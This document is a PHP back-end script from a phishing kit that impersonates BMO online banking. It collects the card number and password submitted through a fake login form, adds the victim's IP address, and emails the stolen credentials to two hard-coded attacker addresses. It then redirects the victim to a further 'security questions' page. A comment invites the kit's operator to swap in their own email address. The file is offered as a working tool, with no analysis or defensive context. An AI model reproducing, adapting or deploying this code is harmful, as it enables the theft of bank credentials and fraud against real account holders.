<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------B M O Info-----------------\n";
$message .= "BMO Card Number: ".$_POST['formtext1']."\n";
$message .= "Password : ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "-------------Created BY Ban147----------\n";
//change your Email address here
$send = "ikdavidgod4@gmail.com,chukuma1111@outlook.com";
$subject = "B M O Login Info";
$headers = "From: B M OInfo<ikdavidgod4@gmail.com,chukuma1111@outlook.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}	
		   header("Location: security-questions.html");

	 
?>